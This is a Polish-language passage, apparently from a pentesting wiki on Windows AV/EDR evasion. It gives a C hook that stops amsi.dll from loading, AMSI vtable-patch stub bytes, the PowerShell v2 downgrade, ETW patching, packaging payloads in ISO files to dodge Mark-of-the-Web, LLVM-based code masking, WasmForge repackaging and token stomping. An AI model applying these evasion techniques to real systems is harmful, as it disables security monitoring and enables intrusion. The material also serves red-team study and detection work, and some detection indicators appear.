Inny bypass lokalny dla procesu pozostawia punkt wejścia `AmsiScanBuffer` nietknięty. W opisanym 64-bitowym loaderze .NET obiekt AMSI COM jest tworzony na podstawie CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` zwraca wskaźnik interfejsu, a jego slot vtable pod offsetem `0x18` jest używany jako cel wywołania skanowania. Loader patchuje natywny wskaźnik funkcji `Console.Clear()` niewielkim stubem x64, zmienia ten wpis vtable na stub za pomocą `VirtualProtect()`, a następnie przywraca pierwotne uprawnienia strony pamięci. Wymagane są zarówno 64-bitowa szerokość wskaźnika, jak i oczekiwany układ COM; nie jest to uniwersalny offset dla dowolnych interfejsów AMSI ani kompilacji. Wcześniej zaobserwowane etapy obejmują [ładowanie sidecara Signed AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) oraz [deserializację RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Zaobserwowane bajty stuba to `41 C7 00 01 00 00 00 33 C0 C3`: zapisują **1** pod wskaźnikiem wyniku w `r8` i zwracają **0** w `eax`. Zatem opisane twierdzenie, że wynik skanowania to `AMSI_RESULT_CLEAN` (0), myli wartość zwracaną `S_OK` z wyjściową wartością enum. W udokumentowanej kolejności `AMSI_RESULT` wynik **1** oznacza `AMSI_RESULT_NOT_DETECTED`; nadal znajduje się poniżej progu wykrywania.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjalizowane dopiero po załadowaniu amsi.dll do bieżącego procesu. Solidny bypass, niezależny od języka, polega na założeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nie zostaje załadowane i w tym procesie nie są wykonywane żadne skanowania.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa w PowerShell, WScript/CScript oraz niestandardowych loaderach (we wszystkim, co w innym przypadku ładowałoby AMSI).
- Warto połączyć tę metodę z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów wiersza poleceń.
- Zaobserwowano jej użycie przez loadery uruchamiane za pośrednictwem LOLBins (np. `regsvr32` wywołujące `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt do bypassu AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do bypassu AMSI, który unika sygnatur dzięki losowym, zdefiniowanym przez użytkownika funkcjom, zmiennym i wyrażeniom znakowym oraz losowej zmianie wielkości liter w słowach kluczowych PowerShell, aby uniknąć sygnatur.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** lub **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli używasz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić:

```bash
powershell.exe -version 2
```

## Logowanie PS

Logowanie PowerShell to funkcja umożliwiająca rejestrowanie wszystkich poleceń PowerShell wykonywanych w systemie. Może być przydatna do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć logowanie PowerShell, możesz zastosować następujące techniki:

- **Wyłącz PowerShell Transcription i Module Logging**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: W PowerShell w wersji 2 AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby hostować PowerShell bez uruchamiania `powershell.exe` (takie podejście stosuje `powerpick` w Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani wszystkich innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrycie przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko wybranych sekcji kodu, które zawierają wrażliwe informacje lub powinny pozostać ukryte.

### Dekompilowanie chronionych przez ConfuserEx plików binarnych .NET

Podczas analizy malware używającego ConfuserEx 2 (lub komercyjnych forków) często napotyka się kilka warstw zabezpieczeń, które blokują dekompilatory i sandboxy. Poniższy proces niezawodnie **przywraca IL zbliżony do oryginału**, który można następnie zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usuwanie zabezpieczenia przed modyfikacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je w statycznym konstruktorze *modułu* (`<Module>.cctor`). Modyfikuje również sumę kontrolną PE, więc każda zmiana spowoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby odnaleźć zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać czysty zestaw:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Wynik zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy tworzeniu własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *czysty* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flagi:
     • `-p crx` – wybiera profil ConfuserEx 2
     • de4dot cofa control-flow flattening, przywraca oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfrowuje stałe ciągi znaków.

3.  Usuwanie proxy-callów – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne standardowe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieprzejrzystych funkcji opakowujących (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy i wyszukaj duże bloki Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *właściwy* payload. Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonywania **bez** konieczności uruchamiania złośliwej próbki – przydatne podczas pracy na stacji roboczej offline.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznego sortowania próbek.

#### Polecenie jednowierszowe
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuskator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie otwartoźródłowego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo oprogramowania dzięki [obfuskacji kodu](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i ochronie przed manipulacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje, jak używać języka `C++11/14`, aby generować obfuskowany kod na etapie kompilacji, bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuskator plików binarnych x64, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorfnego dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to precyzyjny framework do obfuskacji kodu dla języków obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co podważa nasze naturalne wyobrażenie o normalnym przepływie sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące pliki EXE/DLL do postaci shellcode, a następnie je ładować

### Samomaskowanie per funkcję wspomagane kompilatorem LLVM

Zamiast maskować cały implant tylko wtedy, gdy jest uśpiony, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje zamaskowane XOR-em, gdy nie są aktywne. PoC Function Peekaboo wybiera zdemanglowane nazwy zawierające `REG_`, wstawia niezależne od położenia stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden współdzielony handler maskujący w `.text`; sygnatury na poziomie źródłowym i konwencja wywołań Windows x64 pozostają bez zmian.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania w backendzie

Transformację należy wykonać po wyborze instrukcji i optymalizacji, ponieważ musi ona objąć **każdy wyemitowany return** i znać dokładny układ x86. Przed emisją `MachineFunctionPass` znajduje ostatni `MachineInstr::isReturn()`, usuwa go, aby ostatnia ścieżka przechodziła dalej do dołączonego epilogu, a wcześniejsze instrukcje return zastępuje przez `JMP_1 handler`. Należy zachować wszelkie wygenerowane przez kompilator instrukcje zwalniania stosu/ramki poprzedzające każdy return; przekierować należy tylko samą instrukcję return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emitują stuby dla poszczególnych funkcji, a `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji pozwalają, by skok z prologu wskazywał na emitowany później epilog; w przypadku ręcznie emitowanego bliskiego `je` należy zapisać `0F 84`, a następnie czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Pass musi zwrócić `false` dla niewybranej funkcji, jeśli niczego nie zmienił; PoC błędnie zwraca w takiej sytuacji `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i 16-bajtowe rekordy zawierające wskaźnik do funkcji, relokowany przez loader, oraz długość wyznaczaną w czasie działania, w sekcji `.funcmeta`. Chociaż pole C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia `+8` w rekordzie, obejmujący długość i dopełnienie, a rekordy przesuwa o `0x10`. Nazwy sekcji PE mają długość maksymalnie ośmiu bajtów, więc wyszukiwanie w czasie działania widzi `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w niej poprzednie RVA punktu wejścia i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przeszukuje importy PE32+, aby znaleźć już zaimportowaną funkcję `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inicjalizacja ustawia wartość wartownika w `gs:[0xE8]` i wywołuje każdą funkcję z metadanych. Jej stale czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa wartownika i pomija wciąż niezamaskowane ciało. Epilog używa następnie `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` wskazuje koniec przekształconej funkcji, więc `end - start` można zapisać w jej rekordzie metadanych. Po zamaskowaniu wszystkich ciał stub czyści wartownika i wykonuje skok do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby zdekodować ciało funkcji. Ostatnia ścieżka przechodzi dalej do dołączonego epilogu, natomiast każdy wcześniejszy return skacze bezpośrednio do współdzielonego handlera. Zwykły epilog również używa `jmp handler`, a nie `call`, więc po ponownym zamaskowaniu funkcji instrukcja `ret` handlera pobiera adres powrotu pierwotnego wywołującego i zachowuje wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Prymityw maskowania i wskaźniki analityczne

Handler znajduje bieżący rekord, pomija stały, widoczny prolog (`0x46` bajtów w tej kompilacji), zmienia ochronę pozostałej części na `PAGE_EXECUTE_READWRITE`, wykonuje XOR każdego bajtu z najmłodszym bajtem klucza, a następnie ustawia ochronę na `PAGE_EXECUTE_READ`. Ta sama pętla dekoduje więc funkcję przy wejściu i koduje ją przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Silne wskaźniki charakterystyczne dla tego rozwiązania:<sup>[[38]](#references)[[39]](#references)</sup>

- punkt wejścia wewnątrz wykonywalnej sekcji `.stub` oraz sekcja `.funcmet` zawierająca klucz i relokowane wskaźniki do `.text`;
- parsowanie PEB, tablicy importów i tablicy sekcji przed CRT, a następnie wywołania przez każdy wskaźnik z metadanych;
- identyczne prologi PIC `call`/`pop` oraz liczne miejsca powrotu przekierowane do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany ochrony przez `VirtualProtect` i bajtowe zapisy XOR do wspieranych obrazem stron wykonywalnych.

To unikanie skanerów pamięci, a nie ochrona kryptograficzna: zmodyfikowany plik nadal zawiera oryginalne, niezamaskowane ciało funkcji, a debugger może zatrzymać wykonanie na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` również ułatwiają odzyskanie kodu offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Miejsca TEB używane przez PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są wspólne dla całego procesu. Równoczesne lub rekurencyjne wejście może zatem ponownie przełączać instrukcje, gdy inne wywołanie jest w trakcie wykonywania; wyjątki i wyjścia nielokalne mogą również ominąć ponowne maskowanie. Solidna implementacja musi synchronizować przejścia, przywracać rzeczywistą ochronę zwróconą przez `lpflOldProtect`, unikać zakodowanych na stałe długości stubów, sprawdzić ścieżki `call` i `jmp` pod kątem wyrównania stosu x64 oraz wywołać `FlushInstructionCache` po ponownym zapisaniu bajtów wykonywalnego kodu. Microsoft wyraźnie wskazuje, że za spójność pamięci podręcznej instrukcji po modyfikacji kodu wykonywalnego odpowiada wywołujący.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i uruchamiania ich.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, którego celem jest ochrona użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, który ostrzeże użytkownika końcowego i uniemożliwi mu uruchomienie pliku (plik można jednak uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [alternatywny strumień danych NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu wraz z adresem URL, z którego zostały pobrane.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie strumienia ADS Zone.Identifier pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołują SmartScreen**.

Bardzo skutecznym sposobem na zapobieganie nadawaniu payloadom Mark of The Web jest umieszczanie ich w kontenerze, na przykład w pliku ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów, aby ominąć Mark-of-the-Web.

Przykładowe użycie:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo pokazujący, jak ominąć SmartScreen, pakując payloady w pliki ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to zaawansowany mechanizm rejestrowania zdarzeń w systemie Windows, który pozwala aplikacjom i składnikom systemu **rejestrować zdarzenia**. Mogą go jednak również używać produkty bezpieczeństwa do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak można wyłączyć (ominąć) AMSI, można też sprawić, by funkcja **`EtwEventWrite`** procesu w przestrzeni użytkownika natychmiast zwracała wynik bez rejestrowania zdarzeń. W tym celu funkcja jest patchowana w pamięci tak, aby natychmiast zwracała wynik, co skutecznie wyłącza rejestrowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) oraz [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Ładowanie binariów C# do pamięci jest znane od dawna i nadal stanowi bardzo dobry sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania go na dysku, wystarczy nam patchowanie AMSI w całym procesie.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itp.) umożliwia już bezpośrednie uruchamianie C# assemblies w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, uruchomieniu tego kodu, a po zakończeniu — zabiciu nowego procesu. Ta metoda ma zarówno zalety, jak i wady. Jej zaletą jest to, że wykonanie odbywa się **poza** procesem naszego implant Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działań post-exploitation lub zostaniemy wykryci, **szansa na przetrwanie** naszego **implantu jest znacznie większa**. Wadą jest **większe prawdopodobieństwo** wykrycia przez **detekcje behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu unikniesz tworzenia nowego procesu i skanowania go przez AV. Wadą jest jednak **znacznie większa szansa** na **utratę swojego beacona**, jeśli podczas wykonywania payloadu coś pójdzie nie tak, ponieważ proces może ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu C# Assembly, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz zapoznaj się z BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z PowerShell** — sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Przepakowywanie narzędzi .NET do WebAssembly za pomocą NativeAOT (WasmForge)

Standardowe techniki `execute-assembly` zachowują rozpoznawalny MSIL i ostatecznie inicjują CLR. **WasmForge** zmienia natomiast środowisko wykonawcze: migruje projekt C# do eksperymentalnego celu NativeAOT-LLVM WASI, kompiluje go z wyprzedzeniem do WebAssembly i osadza ten moduł w hoście PE dla Windows opartym na Wazero. Wynikowy proces nie wymaga CLR, JIT ani hosta `dotnet` na komputerze docelowym, dlatego reguły oparte wyłącznie na nazwach zarządzanych assemblies, ładowaniu CLR, AMSI lub .NET ETW tracą bezpośredni wgląd. Jest to technika unikania wykrycia i pakowania, a nie obejście granicy uprawnień — gość zachowuje uprawnienia oryginalnego narzędzia i jego obserwowalne zachowanie w systemie operacyjnym.<sup>[[44]](#references)[[45]](#references)</sup>

### Budowanie projektu C#

Zalecaną metodą budowania jest środowisko Docker projektu, które zawiera .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker oraz zależności do podpisywania. Plik `.csproj` jest wykrywany automatycznie; pojedyncze polecenie budowania wykonuje migrację, poprawki zgodności, kompilację WASM, tworzenie PE i podpisywanie.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

W celu rozwiązywania problemów lub przeglądania wygenerowanego kodu podziel proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` oraz końcowe `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Obraz builda używa też wrappera `wasm-component-ld`, aby uniknąć kodowania komponentu WASI Preview 2 i wygenerować zwykły moduł oczekiwany przez osadzony runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Mostkowanie C# wasm32 do x64 Win32

Nie jest to transparentna rekompilacja. NativeAOT-WASI nie obsługuje niektórych funkcji BCL związanych z Windows lub zmienia ich działanie, a gość wasm32 zwykle przydziela czterobajtowe sloty na wskaźniki, podczas gdy API x64 może zwracać wskaźniki ośmiobajtowe. WasmForge rozwiązuje oba problemy za pomocą następujących generowanych warstw:<sup>[[44]](#references)</sup>

1. Patcher kodu źródłowego koryguje różnice semantyczne specyficzne dla AOT i przekierowuje nieobsługiwane wywołania dotyczące rejestru, potoków, WMI, tożsamości, usług katalogowych, wersji plików, LSA i podobnych funkcji do helperów `Wf*`.
2. Skaner P/Invoke generuje mapowania NativeAOT `DirectPInvoke`, dzięki którym wywołania `[DllImport]` wiążą się z połączonymi symbolami mostka C zamiast dynamicznie ładować zadeklarowaną bibliotekę DLL wewnątrz gościa.
3. Wskaźniki przekazywane do hosta używają w C# typu `ulong`, a w C — `uint64_t`. Ogólny dispatcher przekazuje wywołanie do handlera Win32 hosta; `out8_mask` oznacza rzeczywiste ośmiobajtowe sloty wyjściowe, których górne połowy należy zachować. W przypadku nieoznaczonych wyjść o układzie wasm32 stosowana jest ochrona snapshot/restore, aby zapis x64 nie uszkodził sąsiednich czterech bajtów.
4. Dedykowane mostki hosta obsługują operacje, które nie pasują do ogólnego dispatchu syscalli, takie jak dostęp do pamięci podręcznej biletów LSA, operacje Kerberos/BCrypt ze strukturyzowanymi wynikami, ruch TCP KDC i zapytania LDAP.

Na przykład wrapper dla `version.dll!VerQueryValueW` przekazuje cztery adresy hosta i ustawia bity 2 i 3 (`0xC`), ponieważ wskaźnik wartości i długość są ośmiobajtowymi slotami wyjściowymi. Sam wrapper pozostaje ogólny i przekazuje nazwę DLL, nazwę eksportu, argumenty oraz maskę do `wf_call_v2`; host wykonuje translację wskaźników i wywołuje natywne API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograniczenia i punkty zwrotne wykrywania

Kod intensywnie korzystający z refleksji, dynamiczne ładowanie assembly, dowolne natywne callbacki i złożone struktury x64 zwracane do pamięci WASM nadal mogą wymagać poprawek dla poszczególnych narzędzi albo całkowicie zawieść. Ogólne gniazda WASI Preview 2 mogą również trafiać do pustych stubów, dlatego obsługiwane narzędzia używają host shimów specyficznych dla danego protokołu. Weryfikuj każde polecenie względem natywnej kompilacji, zamiast zakładać równoważność funkcji.<sup>[[44]](#references)[[45]](#references)</sup>

Ta technika zmienia ślady telemetryczne, zamiast czynić payload niewidocznym. Wykrywanie może skupić się na pliku PE zawierającym moduł WASM lub materializującym go, zachowaniu podobnym do środowiska uruchomieniowego Wazero, nietypowym przydzielaniu i kopiowaniu pamięci hosta i gościa, ogólnym bezpośrednim wywoływaniu Win32, anomaliach podpisu i zasobów PE, a także na wynikowych wywołaniach API i ruchu sieciowym. Brak zdarzeń CLR-load, AMSI lub .NET ETW nie powinien zatem być traktowany jako dowód, że proces jest nieszkodliwy.<sup>[[44]](#references)</sup>

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu w innych językach, zapewniając przejętej maszynie dostęp **do środowiska interpretera zainstalowanego na kontrolowanym przez atakującego udziale SMB**.

Udostępniając pliki binarne interpretera i środowisko na udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** przejętej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd., mamy **większą elastyczność w omijaniu sygnatur statycznych**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokenu może pozwolić procesowi działać dalej, jednocześnie uniemożliwiając mu wykonywanie uprzywilejowanych działań inspekcyjnych lub naprawczych.

Aby temu zapobiec, Windows mógłby **uniemożliwić procesom zewnętrznym** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Używanie zaufanego oprogramowania

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go, aby przejąć nad nim kontrolę i utrzymać persistence:<sup>[[35]](#references)</sup>
